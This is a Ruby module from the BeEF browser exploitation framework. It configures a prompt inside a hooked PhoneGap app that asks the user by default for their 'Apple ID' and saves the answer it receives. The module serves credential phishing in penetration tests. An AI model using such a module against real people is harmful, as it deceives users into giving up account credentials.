#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
# Phonegap_prompt_user
#

class Phonegap_prompt_user < BeEF::Core::Command
  
    def self.options
        return [{
            'name' => 'title', 
            'description' => 'Prompt title', 
            'ui_label'=>'Title', 
            'value' => 'Apple ID',
            'width' => '300px'
            
            },{
            'name' => 'question', 
            'description' => 'Prompt question', 
            'ui_label'=>'Question', 
            'value' => 'Please enter your Apple ID',
            'width' => '300px'
            },{
            'name' => 'ans_yes', 
            'description' => 'Prompt positive answer button label', 
            'ui_label'=>'Yes', 
            'value' => 'Submit',
            'width' => '100px'
            },{
            'name' => 'ans_no', 
            'description' => 'Prompt negative answer button label', 
            'ui_label'=>'No', 
            'value' => 'Cancel',
            'width' => '100px'
            }]
  end

  def callback
    content = {}
    content['Result'] = @datastore['result']
    save content
  end 

end
